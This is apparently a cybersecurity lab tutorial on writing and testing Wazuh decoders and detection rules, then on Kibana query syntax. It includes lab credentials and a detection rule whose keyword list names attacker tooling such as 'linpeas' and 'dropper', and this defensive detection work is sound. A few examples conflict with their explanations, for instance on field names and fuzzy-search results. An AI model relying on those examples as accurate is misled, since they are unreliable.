To help us better understand what Decoders are and how they work, let us look at how logs from a tool like Sysmon (System Monitor) are processed. As a popular tool, there is already a pre-existing decoder for this listed in the `windows_decoders.xml` file on [Wazuh's Github page](https://github.com/wazuh/wazuh-ruleset/tree/b26f7f5b75aab78ff54fc797e745c8bdb6c23017/decoders).
 This file can also be downloaded for your reference by clicking on the 
"Download Task Files" button on the top right corner of this task.

windows_decoders.xml

```xml
<decoder name="Sysmon-EventID#1_new"><parent>windows</parent><type>windows</type><prematch>INFORMATION\(1\).+Hashes</prematch><regex>Microsoft-Windows-Sysmon/Operational: \S+\((\d+)\)</regex><order>id</order></decoder>
```

Let's break down the parts of this Decoder block:

- **decoder name** - The
name of this decoder. (Note: Multiple decoder blocks can have the same
name; think of this as though they are being grouped together).
- **parent** - The name of the parent decoder. The parent decoder is processed first before the children are
- **prematch** - Uses regular expressions to look for a match. If this succeeds, it will process the "regex" option below.
- **regex** - Uses regular expressions to extract data. Any string in between a non-escaped open and closed parenthesis is extracted.
- **order** - Contains a list of names to which the extracted data will be stored.

There are a whole lot more options that can be set for decoders. For now, we are only interested in the ones listed above. If you want to check out all the options, you can visit the Wazuh documentation's [Decoder Syntax page](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/decoders.html).

For us to know what data is to be extracted, we need to look at an example log entry from Sysmon:

Sysmon Log

```
Mar 29 13:36:36 WinEvtLog: Microsoft-Windows-Sysmon/Operational: INFORMATION(1): Microsoft-Windows-Sysmon: SYSTEM: NT AUTHORITY: WIN-P57C9KN929H: Process Create:  UtcTime: 2017-03-29 11:36:36.964  ProcessGuid: {DB577E3B-9C44-58DB-0000-0010B0983A00}  ProcessId: 3784  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Users\Alberto\Desktop\test.ps1"  CurrentDirectory: C:\Users\Alberto\Desktop\  User: WIN-P57C9KN929H\Alberto  LogonGuid: {DB577E3B-89E5-58DB-0000-0020CB290500}  LogonId: 0x529cb  TerminalSessionId: 1  IntegrityLevel: Medium  Hashes: MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7  ParentProcessGuid: {DB577E3B-89E6-58DB-0000-0010FA3B0500}  ParentProcessId: 2308  ParentImage: C:\Windows\explorer.exe  ParentCommandLine: C:\Windows\Explorer.EXE
```

The log entry above shows an example event a Wazuh agent installed in a Windows machine sent. It describes an event where the user ran a PowerShell script named `test.ps1` from his system using the `powershell.exe` executable initiated by the Explorer process (`C:\Windows\explorer.exe`). As you can see, there's a lot of data in there, and it is a decoder's job to extract them.

Once this log entry is ingested, all appropriate decoder blocks will kick into action where they will first check the `prematch` option.

The decoder block above will check if any strings match the regular expression, "INFORMATION\(1\).+Hashes".

If you feel your regex-fu needs some refreshing, let's break down the step-by-step process of how this will go:

- First, the regex will look for the `INFORMATION` string.
- Followed by an escaped open parenthesis `\(`.
- Followed by a number `1`.
- Followed by an escaped close parenthesis `\)`.
- And then any number of characters `.+`.
- Until it reaches the `Hashes` string.

If
 you check the expression above with the log entry, you will find out it
 is a match. And because it is a match, the decoder would process the `regex` option below. This time it will try to match the string, "Microsoft-Windows-Sysmon/Operational: \S+\((\d+)\)":

- First, the regex will look for the `Microsoft-Windows-Sysmon/Operational:` string.
- Followed by any string of any length `\S+`.
- Followed by an escaped open parenthesis.
- Followed by an open parenthesis `(` (Remember, this is where the extracted data will start).
- Then by any digit character of any length `\d+`.
- Then a closing parenthesis `)` (This is where the extracted data ends).
- And finally followed by an escaped closing parenthesis `\)`.

After all of the above steps, the value of `1` will be extracted and stored in the `id` field as listed it the `order` option.

# Testing the Decoder

We can quickly test decoders from the Wazuh dashboard using the "Ruleset Test" tool. But first, let's access the dashboard:

1. If you haven't yet, run the virtual machine by pressing the "Start Machine" button on Task 1. Wait for a few minutes for Wazuh to load correctly.
2. To access the Wazuh dashboard, you can do it in two ways:
    - Connect via OpenVPN (More info [here](https://tryhackme.com/access)) and then type the machine's IP `http://10.10.105.156` on your browser's address bar.
    - Log in to AttackBox VM, open the web browser inside AttackBox, and then type the machine's IP `http://10.10.105.156` on the address bar.
- You'll encounter a Security alert, which you can safely ignore by clicking "Advanced > Accept the Risk and Continue".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/9d4e4d8dfa8c9892bef8f7209b47a1a9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/9d4e4d8dfa8c9892bef8f7209b47a1a9.png)

- When presented with the Wazuh login screen, enter `wazuh` for the username and `TryHackMe!` for the password.

Once in the Wazuh dashboard, access the "Ruleset Test" tool page by doing the following:

1. Click on the dropdown button on the Wazuh Logo
2. Click on Tools > Ruleset Test

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/bccecb29b2fd65e75e875b7ec4e17668.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/bccecb29b2fd65e75e875b7ec4e17668.png)

Once on the Ruleset Test page, paste the example Sysmon log entry above into the textbox and click the "Test" button. This will output the following results:

Ruleset Test Output

```
**Phase 1: Completed pre-decoding.
    full event:  Mar 29 13:36:36 WinEvtLog: Microsoft-Windows-Sysmon/Operational: INFORMATION(1): Microsoft-Windows-Sysmon: SYSTEM: NT AUTHORITY: WIN-P57C9KN929H: Process Create:  UtcTime: 2017-03-29 11:36:36.964  ProcessGuid: {DB577E3B-9C44-58DB-0000-0010B0983A00}  ProcessId: 3784  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Users\Alberto\Desktop\test.ps1"  CurrentDirectory: C:\Users\Alberto\Desktop\  User: WIN-P57C9KN929H\Alberto  LogonGuid: {DB577E3B-89E5-58DB-0000-0020CB290500}  LogonId: 0x529cb  TerminalSessionId: 1  IntegrityLevel: Medium  Hashes: MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7  ParentProcessGuid: {DB577E3B-89E6-58DB-0000-0010FA3B0500}  ParentProcessId: 2308  ParentImage: C:\Windows\explorer.exe  ParentCommandLine: C:\Windows\Explorer.EXE
    timestamp: Mar 29 13:36:36
    hostname: WinEvtLog:
    program_name: WinEvtLog

**Phase 2: Completed decoding.
    name: windows
    parent: windows
    data: {
      "srcuser": "WIN-P57C9KN929H\\Alberto",
      "id": "1",
      "sysmon": {
            "processGuid": "{DB577E3B-9C44-58DB-0000-0010B0983A00    }",
            "processId": "3784",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "commandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"-file\" \"C:\\Users\\Alberto\\Desktop\\test.ps1\"",
            "currentDirectory": "C:\\Users\\Alberto\\Desktop\\",
            "logonGuid": "{DB577E3B-89E5-58DB-0000-0020CB290500}",
            "logonId": "0x529cb",
            "terminalSessionId": "1",
            "integrityLevel": "Medium",
            "hashes": "92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7",
            "parentProcessGuid": "{DB577E3B-89E6-58DB-0000-0010FA3B0500}",
            "parentProcessId": "2308",
            "parentImage": "C:\\Windows\\explorer.exe"
      }
}
```

As you can see in the output above, this output has three stages. For
 the topic of Decoders, we will focus on the first two phases for now.

- Phase 1 is the pre-decoding phase. The event log is parsed, and the header
details like timestamp, hostname, and program_name are retrieved. This
is done automatically on the backend by Wazuh.
- Phase 2 is the decoding phase, where the decoders do their magic. When done,
all the extracted data from the declared decoder blocks are displayed
here. For example, we can see in the results that the "id" field has
been assigned the value of 1, which shows that the decoder works.

As
 for the other data like "processGuid", "processId", etc.), they were 
extracted by a separate decoder block, like the one below:

windows_decoders.xml

```xml
<decoder name="Sysmon-EventID#1_new"><parent>windows</parent><type>windows</type><regex offset="after_regex">ProcessGuid: (\.*) \s*ProcessId: (\.*) \s*Image: (\.*) \s*CommandLine: (\.*)\s+CurrentD</regex><order>sysmon.processGuid, sysmon.processId, sysmon.image, sysmon.commandLine</order></decoder>
```

You will notice more values in the `order` option in this decoder. Each named value corresponds to the number of data enclosed in the parenthesis found in the `regex` option. In this case, the data in the first pair of parenthesis`()` will be stored on `sysmon.processGuid`, the second on `sysmon.processId`, and so on.

**Rules**

Rules
 contain defined conditions to detect specific events or malicious 
activities using the extracted data from decoders. An alert is generated
 on the Wazuh dashboard when an event matches a rule.

In this task, we will look at the pre-existing Sysmon rules defined in the `sysmon_rules.xml` rule file found on Wazuh's [Github page](https://github.com/wazuh/wazuh/blob/master/ruleset/rules/0330-sysmon_rules.xml). This
 file can also be downloaded for your reference by clicking on the 
"Download Task Files" button on the top right corner of this task.

The downloaded file contains multiple rule blocks, but we will focus primarily on blocks that look for suspicious Sysmon events with an ID of 1.

# Understanding Rules

Here is an example of an alert rule that looks for the "svchost.exe" string in the "sysmon.image" field:

sysmon_rules.xml

```xml
<rule id="184666" level="12"><if_group>sysmon_event1</if_group><field name="sysmon.image">svchost.exe</field><description>Sysmon - Suspicious Process - svchost.exe</description><mitre><id>T1055</id></mitre><group>pci_dss_10.6.1,pci_dss_11.4,...</group></rule>
```

A rule block has multiple options. In this case, the options that interest us at this moment are the following:

- **rule id** - The unique identifier of the rule.
- **rule level** - The classification level of the rule ranges from 0 to 15. Each number corresponds to a specific value and severity, as listed in the Wazuh documentation's rule classifications page [here](https://documentation.wazuh.com/current/user-manual/ruleset/rules-classification.html).
- **if_group** - Specifies the group name that triggers this rule when that group has matched.
- **field name** - The name of the field extracted from the decoder. The value in this field is matched using regular expressions.
- **group**  Contains a list of groups or categories that the rule belongs to. It can be used for organizing and filtering rules.

As with decoders, there are other options available for rules. You can check out the complete list on the [Rules Syntax page](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html) in the Wazuh documentation.

# Testing the Rule

Go back to the "Ruleset Test" page. Paste the exact log entry we used in the previous task. The result should be the same, but this time, we will focus on Phase 3 of the output.

Ruleset Test Output

```
**Phase 3: Completed filtering (rules).
    id: 184665
    level: -
    description: Sysmon - Event 1
    groups: ["sysmon","sysmon_event1"]
    firedtimes: 1
    gdpr: "-"
    gpg13: "-"
    hipaa: "-"
    mail: "-"
    mitre.id: "-"
    mitre.technique: "-"
    nist_800_53: "-"
    pci_dss: "-"
    tsc: "-"
```

Phase 3 shows what information an alert would contain when a rule is triggered, like "id", "level", "description", etc.

Right now, the output shows that the triggered rule ID is `184665`. This is not the rule block that we examined above, which has the ID of `184666`. The reason for this is that `184666`
 is looking for "svchost.exe" in the "sysmon.image" field option. For 
this rule to trigger, we need to change 
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" to "C:\WINDOWS\system32\svchost.exe", as shown below:

Sysmon Log

```xml
Mar 29 13:36:36 WinEvtLog: Microsoft-Windows-Sysmon/Operational: INFORMATION(1): Microsoft-Windows-Sysmon: SYSTEM: NT AUTHORITY: WIN-P57C9KN929H: Process Create:  UtcTime: 2017-03-29 11:36:36.964  ProcessGuid: {DB577E3B-9C44-58DB-0000-0010B0983A00}  ProcessId: 3784  Image: C:\WINDOWS\system32\svchost.exe  CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-file" "C:\Users\Alberto\Desktop\test.ps1"  CurrentDirectory: C:\Users\Alberto\Desktop\  User: WIN-P57C9KN929H\Alberto  LogonGuid: {DB577E3B-89E5-58DB-0000-0020CB290500}  LogonId: 0x529cb  TerminalSessionId: 1  IntegrityLevel: Medium  Hashes: MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7  ParentProcessGuid: {DB577E3B-89E6-58DB-0000-0010FA3B0500}  ParentProcessId: 2308  ParentImage: C:\Windows\explorer.exe  ParentCommandLine: C:\Windows\Explorer.EXE
```

When this is done, press the "Test" button again to run the Ruleset 
Test. The output should now be different, especially in Phase 3:

Ruleset Test Output

```
**Phase 3: Completed filtering (rules).
    id: 184666
    level: 12
    description: Sysmon - Suspicious Process - svchost.exe
    groups: ["sysmon","sysmon_process-anomalies"]
    firedtimes: 1
    gdpr: ["IV_35.7.d"]
    gpg13: "-"
    hipaa: ["164.312.b"]
    mail: true
    mitre.id: {"id":["T1055"],"tactic":["Defense Evasion","Privilege Escalation"],"technique":["Process Injection"]}
    mitre.technique: {"id":["T1055"],"tactic":["Defense Evasion","Privilege Escalation"],"technique":["Process Injection"]}
    nist_800_53: ["AU.6","SI.4"]
    pci_dss: ["10.6.1","11.4"]
    tsc: ["CC7.2","CC7.3","CC6.1","CC6.8"]
**Alert to be generated.
```

Because our rule now matches the log, the triggered Rule is now `184666`. There is now also more information on the output thanks to the `mitre` and `group` options in the rule block.

**Custom Rules**

As 
mentioned before, the pre-existing rules are comprehensive. However, it 
cannot cover all use cases, especially for organizations with unique 
needs and requirements. To compensate for this, we can modify or create 
new rules to customize them for our needs.

There are several reasons why we want to have custom rules:

- You want to enhance the detection capabilities of Wazuh.
- You are integrating a not-so-well-known security solution.
- You use an old version of a security solution with an older log format.
- You recently learned of a new attack and want to create a specific detection rule.
- You want to fine-tune a rule.

We've
 previously looked at how Wazuh processes Sysmon logs from Windows, so 
this time, let's look at the rules for auditd for Linux machines and 
whether it can detect file creation events via Syscalls. This time we 
will be looking at the `auditd_rules.xml` rule file found on Wazuh's [Github page](https://github.com/wazuh/wazuh/blob/master/ruleset/rules/0365-auditd_rules.xml).
 This file can also be downloaded for your reference by clicking on the 
"Download Task Files" button on the top right corner of this task.

To help us better understand how to build our custom rule, let's look at an example of an auditd log:

Auditd Log

```
type=SYSCALL msg=audit(1479982525.380:50): arch=c000003e syscall=2 success=yes exit=3 a0=7ffedc40d83b a1=941 a2=1b6 a3=7ffedc40cce0 items=2 ppid=432 pid=3333 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=2 comm="touch" exe="/bin/touch" key="audit-wazuh-w" type=CWD msg=audit(1479982525.380:50):  cwd="/var/log/audit" type=PATH msg=audit(1479982525.380:50): item=0 name="/var/log/audit/tmp_directory1/" inode=399849 dev=ca:02 mode=040755 ouid=0 ogid=0 rdev=00:00 nametype=PARENT type=PATH msg=audit(1479982525.380:50): item=1 name="/var/log/audit/tmp_directory1/malware.py" inode=399852 dev=ca:02 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=CREATE type=PROCTITLE msg=audit(1479982525.380:50): proctitle=746F756368002F7661722F6C6F672F61756469742F746D705F6469726563746F7279312F6D616C776172652E7079
```

The log describes an event wherein a `touch` command (probably as root user) was used to create a new file called `malware.py` in the `/var/log/audit/tmp_directory1/` directory. The command was successful, and the log was generated based on an audit rule with the key "audit-wazuh-w".

When Wazuh ingests the above log, the pre-existing rule below will get triggered because of the value of `<match>`:

auditd_rules.xml

```xml
<rule id="80790" level="3"><if_group>audit_watch_write</if_group><match>type=CREATE</match><description>Audit: Created: $(audit.file.name)</description><group>audit_watch_write,audit_watch_create,gdpr_II_5.1.f,gdpr_IV_30.1.g,</group></rule>
```

# Adding Local Rules

For
 this exercise, let's create a custom rule that will override the above 
rule so we have more control over the information we display.

To do this, you need to do the following:

1. Connect to the server using SSH at `10.10.105.156` and use `thm` for the username and `TryHackMe!` the password. The credentials and connection details are listed in Task 1 of this room.
2. Use the `sudo su` command to become the root user.
3. Open the file `/var/ossec/etc/rules/local_rules.xml` using your favourite editor.
4. Paste the following text at the end of the file:

local_rules.xml

```xml
<group name="audit,"><rule id="100002" level="3"><if_sid>80790</if_sid><field name="audit.cwd">downloads|tmp|temp</field><description>Audit: $(audit.exe) created a file with filename $(audit.file.name) the folder $(audit.directory.name).</description><group>audit_watch_write,</group></rule></group>
```

The
 rule above will get triggered if a file is created in the downloads, 
tmp, or temp folders. Let's break this down so we can better understand:

- **group name="audit,"** We are setting this to the same value as the grouped rules in audit_rules.xml.
- rule id="100002" - Each custom rule needs to have a unique ID. Custom IDs start from `100001` onwards. Since there is already an existing example rule that uses `100001`, we are going to use `100002`.
- **level="3"** - We are setting this to 3 (Successful/Authorized events) because a file created in these folders isn't necessarily malicious.
- **if_sid** - We set the parent to rule ID `80790` because we want that rule to be processed before this one.
- **field name="audit.directory.name"**  The string here is matched using regex. In this case, we are looking
for tmp, temp, or downloads matches. This value is compared to the `audit.cwd` variable fetched by the auditd decoder.
- **description** The description that will appear on the alert. Variables can be used here using the format `$(variable.name)`.
- **group** - Used for grouping this specific alert. We just took the same value from rule `80790`.

Save the file and run the code below to restart wazuh-manager so it can load the new custom rules:

Bash

```
systemctl restart wazuh-manager

```

Go back to the Wazuh dashboard, access the "Ruleset Test" page and 
paste the sample auditd log entry found above. If all goes well, you 
should see the following "Phase 3" output:

Ruleset Test Output

```
**Phase 3: Completed filtering (rules).
	id: '100002'
	level: '3'
	description: 'Audit: /bin/touch created a file with filename /var/log/audit/tmp_directory1/malware.py the folder /var/log/audit.'
	groups: '["audit","audit_watch_write"]'
	firedtimes: '1'
	mail: 'false'
```

From the results above, we can see that the custom rules that we created triggered an alert successfully.

**Fine-Tuning**

You can fine-tune the 
custom rule by adding more child rules, each focusing on specific 
related data from the logs. For example, you can use the values decoded 
by `auditd` decoder, as shown in the Phase 2 results of the previous test.

Ruleset Test Output

```
**Phase 2: Completed decoding.
	name: 'auditd'
	parent: 'auditd'
	audit.arch: 'c000003e'
	audit.auid: '0'
	audit.command: 'touch'
	audit.cwd: '/var/log/audit'
	audit.directory.inode: '399849'
	audit.directory.mode: '040755'
	audit.directory.name: '/var/temp/downloads/tmp_directory1/'
	audit.egid: '0'
	audit.euid: '0'
	audit.exe: '/bin/touch'
	audit.exit: '3'
	audit.file.inode: '399852'
	audit.file.mode: '0100644'
	audit.file.name: '/var/log/audit/tmp_directory1/malware.py'
    ....
```

We can use the above data to make our detection rules as broad or as specific as needed. The following is an expanded version of `local_rules.xml` that incorporates more of the log's data.

local_rules.xml

```xml
<group name="audit,"><rule id="100002" level="3"><if_sid>80790</if_sid><field name="audit.directory.name">downloads|tmp|temp</field><description>Audit: $(audit.exe) created a file with filename $(audit.file.name) in the folder $(audit.directory.name).</description><group>audit_watch_write,</group></rule><rule id="100003" level="12"><if_sid>100002</if_sid><field name="audit.file.name">.py|.sh|.elf|.php</field><description>Audit: $(audit.exe) created a file with a suspicious file extension: $(audit.file.name) in the folder $(audit.directory.name).</description><group>audit_watch_write,</group></rule><rule id="100004" level="6"><if_sid>100002</if_sid><field name="audit.success">no</field><description>>Audit: $(audit.exe) created a file with filename $(audit.file.name) but failed</description><group>audit_watch_write,</group></rule><rule id="100005" level="12"><if_sid>100003</if_sid><field name="audit.file.name">>malware|shell|dropper|linpeas</field><description>Audit: $(audit.exe) created a file with suspicious file name: $(audit.file.name) in the folder $(audit.directory.name).</description><group>audit_watch_write,</group></rule><rule id="100006" level="0"><if_sid>100005</if_sid><field name="audit.file.name">malware-checker.py</field><description>False positive. "malware-checker.py" is used by our red team for testing. This is just a temporary exception.</description><group>audit_watch_write,</group></rule></group>
```

You can test these rules by updating the `local_rules.xml` file and checking the output on the Ruleset Test Page.

**A Primer on Advanced Queries**

Before you learn about different advanced queries, there are several things that you need to know first.

# Different Syntaxes

Kibana supports two types of syntax languages for querying in Kibana: KQL (Kibana Query Language) and Lucene Query Syntax.

- Kibana Query Language (KQL) is a user-friendly query language developed by
Elastic specifically for Kibana. It provides autocomplete suggestions
and supports filtering using various operators and functions.

***Note:** There is another query language abbreviated as KQL, the Kusto Query Language, for use in Microsoft. This is not the same as the Kibana Query Language. So keep this in mind in case you are searching online.*

- The Lucene Query Syntax is
another query language powered by an open-source search engine library
used as a backend for search engines, including Elasticsearch. It is more powerful than KQL but is harder to learn for beginners.

The
 choice of which syntax to use ultimately depends on the situation and 
the type of data to search for. This is why, in this room, we'll be 
switching from one to the other, which will be communicated throughout.

# Special Characters

Before we introduce the queries, it may be important for you to 
review the following important rules. Knowing this will save you a lot 
of time figuring out why your query is not working as you want it to.

Certain characters are reserved in ELK queries and must be escaped before usage. Reserved characters in ELK include `+`, `-`, `=`, `&&`, `||`, `&`, `|` and `!`. For instance, using the `+` character in a query will result in an error; to escape this character, precede it with a backslash (e.g. `\+`).

For example, say you're searching for documents that contain the term "User+1" in the "username" field. Simply typing `username:User+1` in the query bar will result in an error because the plus symbol is reserved. To escape it, type `username:User\+1`, and the query will return the desired result.

# Wildcards

Wildcards are another concept that can be used to filter data in ELK. Wildcards match specific characters within a field value. For example, using the `*` wildcard will match any number of characters, while using the `?` wildcard will match a single character.

Now for a wildcard scenario. Say you're searching for all documents 
that contain the word "monitor" in the "product_name" field, but the 
spelling may vary (e.g. "monitors", "monitoring"). To capture all 
variants, you can use the `*` wildcard - `product_name:monit*` -
 and the query will return all documents with the word "monitor" in the 
field, regardless of its suffix. Similarly, if you're searching for all 
documents where the "name" field starts with "J" and ends with "n", you 
can use the `?` wildcard - `name:J?n` - The query 
will match any document where the field value begins with a "J" and ends
 with an "n" but will only be three characters long.

**Nested Queries**

Sometimes, values in a data set are nested like in a JSON format. Nested queries allow us to search within these objects without needing an external JSON parser.

Take a look at the dataset below:

| record_id | incident_type | affected_systems | comments |
| --- | --- | --- | --- |
| 1 | DDoS | [{"system": "web-server"}, {"system": "database"}] | [{"author": "Alice", "text": "Mitigated DDoS attack"}, {"author": "Bob", "text": "Checked logs, found suspicious IPs"}] |
| 2 | Malware | [{"system": "web-server"}, {"system": "file-server"}] | [{"author": "Charlie", "text": "Removed malware"}, {"author": "Eve", "text": "Updated antivirus software"}] |
| 3 | Data breach | [{"system": "database"}] | [{"author": "Alice", "text": "Patched vulnerability"}, {"author": "Eve", "text": "Reset all user passwords"}] |
| 4 | Phishing | [{"system": "email-server"}] | [{"author": "Bob", "text": "Blocked phishing email"}, {"author": "Charlie", "text": "Sent warning to all users"}] |
| 5 | Insider threat | [{"system": "file-server"}, {"system": "database"}] | [{"author": "Eve", "text": "Investigating employee activity"},
 {"author": "Alice", "text": "Implementing stricter access controls"}] |

In the above dataset, the "comments" field is an array of objects, where each object has an "author" and a "text" field.

Let's start by just returning all entries with value in the `comments.author` field. We could use the `*` wildcard as we've learned in the previous task:

`comments.author:*`

This would return all entries from 1 to 5. If we then want to search for comments that only contain "Alice", then we can use this query:

`comments.author:"Alice"`

This will return records 1, 3, and 5, as these entries have Alice as the author.

If
 we also want to look for comments with the word "attack" in it, that is
 written by Alice. Then we can combine two queries with the `AND` operator like so:

```
comments.author:"Alice" AND comments.text:attack
```

# Trying it out in

You can try the above queries within Kibana. Here are the steps:

In the Kibana dashboard, open the side panel on the left and click "Discover".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6d8496f1eae30ee274c341b148a2514f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6d8496f1eae30ee274c341b148a2514f.png)

Look for the index pattern dropdown and select the `nested-queries` index pattern. This would be the data that contains the example dataset for this task.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/9474b82dcbb38bd08d87230515533089.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/9474b82dcbb38bd08d87230515533089.png)

Locate the search bar at the top of the page and enter your query here.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/34198d682701fd057e172a63b4edc2de.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/34198d682701fd057e172a63b4edc2de.png)

Input the queries above to see the results in action. For example, the query `comments.author:"Alice" AND comments.text:attack` will show the following results:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/87d11355a1e42d8d7519bc8b15425af8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/87d11355a1e42d8d7519bc8b15425af8.png)

You'll notice that "Alice" and "attack" are highlighted in yellow to show you the matched words.

# Trying it out with a more extensive data set

You can practice all the queries in this room on a more 
extensive dataset containing 1000 entries. Use this to practice and 
answer the questions at the end of every task.

Switch to the `incidents`
 index dataset and then change the date from Jan 1, 2022, to "Now". To 
do so, click the "Show dates" button at the right of the search bar.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/e5b44971a694597d945cbc7e4e1e0ca4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/e5b44971a694597d945cbc7e4e1e0ca4.png)

Click on "15 minutes ago" to change the starting date.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/4de2cc0209b40f69730f6292ed3febdd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/4de2cc0209b40f69730f6292ed3febdd.png)

And
 then, set it to Jan 1, 2022, by clicking on the "Absolute" tab, picking
 the date "Jan 1, 2022 @ 00:00:00.000", and clicking "Update".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/511abcac9dfd3d63a1d54b9398839cd2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/511abcac9dfd3d63a1d54b9398839cd2.png)

You can now search all the data from Jan 1, 2022 up to Now, containing all 1000 entries.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6aa0a44086c173a45c5eaa7ca0d7698e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/6aa0a44086c173a45c5eaa7ca0d7698e.png)

**Ranges**

Range queries allow us to search for documents with field values within a specified range.

Consider the following example dataset:

| alert_id | alert_type | response_time_seconds |
| --- | --- | --- |
| 1 | Malware Detection | 120 |
| 2 | Unusual Login Attempt | 240 |
| 3 | Suspicious Traffic | 600 |
| 4 | Unauthorized File Access | 300 |
| 5 | Phishing Email | 180 |

To search for all documents where the "response_time_seconds" field 
is greater than or equal to 100, then the query for you to use is:

`response_time_seconds >= 100`

Here's one for less than 300:

`response_time_seconds < 300`

And, of course, these can be combined with an `AND` operator.

`response_time_seconds >= 100 AND response_time_seconds < 300`

The query will return the documents with alert_id 1, 2, and 5.

Ranges are beneficial for dates, which you'll get to try in Kibana
 in a later section. There are different ways to search by ranges, and 
one way is by specifying the date by following specific formats.

`@timestamp<"yyyy-MM-ddTHH:mm:ssZ"`

The time is optional, so you can also do the following:

`@timestamp>yyyy-MM-dd`

# Trying it out in

Like in the previous task, you can try the above queries by changing the index, this time to `ranges`.

Use the query `response_time_seconds >= 100 AND response_time_seconds < 300` and you should see the following results:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/eeee3c7370fd43728bf5e0b56ba36069.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/eeee3c7370fd43728bf5e0b56ba36069.png)

**Fuzzy Searches**

Fuzzy searching is 
beneficial when searching for documents with inconsistencies or typos in
 the data. It accounts for these variations and retrieves relevant 
documents by allowing a specified number of character differences (known
 as the fuzziness value) between the search term and the actual field 
value.

For example, if you want to search for "server", you can use a fuzzy 
search to return documents containing "serber", "server01", and 
"server001". See below:

| host_name | status |
| --- | --- |
| server01 | online |
| serber01 | online |
| sirbir01 | offline |
| sorvor01 | online |
| workstation01 | offline |
| workstation001 | offline |

To search for all documents where the "host_name" field is similar, 
but not necessarily identical to "serber", you can use the following 
query:

`host_name:server01~1`

As you can see, the "~" character indicates that we are doing a fuzzy search. The format of the query is as follows:

`field_name:search_term~fuzziness_value`

Using the query above will return the following documents:

```json
{
  "host_name": "server01",
  "status": "online"
},
{
  "host_name": "serber01",
  "status": "online"
}
```

The fuzziness value lets us control how many characters differ from 
the search term. A fuzziness of 1 returns the documents above. A 
fuzziness of 2 returns only the following:

`host_name:server01~2`

```json
{ "host_name": "server01", "status": "online" }, { "host_name": "serber01", "status": "online" },{ "host_name": "sorvor01", "status": "online" },
```

One important thing to note, however, is that fuzzy searching does 
not work on nested data and only matches on one-word strings. Despite 
the limitations, it is still useful, especially for finding typos.

# Trying it out in

Return to Kibana and change the index to `fuzzy-searches`. This time, however, we will be switching our syntax system to use Lucene instead of KQL, as boosting only works in Lucene.

To
 do this, click on the "KQL" button to the right of the search bar, and 
then on the pop-up window, set the "Kibana Query Language" option from 
"On" to "Off". This means that all queries going forward will now use 
"Lucene".

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/85ffcff37ddbe0c6896ebbf63975bb5f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/85ffcff37ddbe0c6896ebbf63975bb5f.png)

With this correctly set up, use `host_name:server01~1` as a query, and then you should get the following results:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/812a3fcfc0c9f2ab9e4dddafe8492f22.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/812a3fcfc0c9f2ab9e4dddafe8492f22.png)

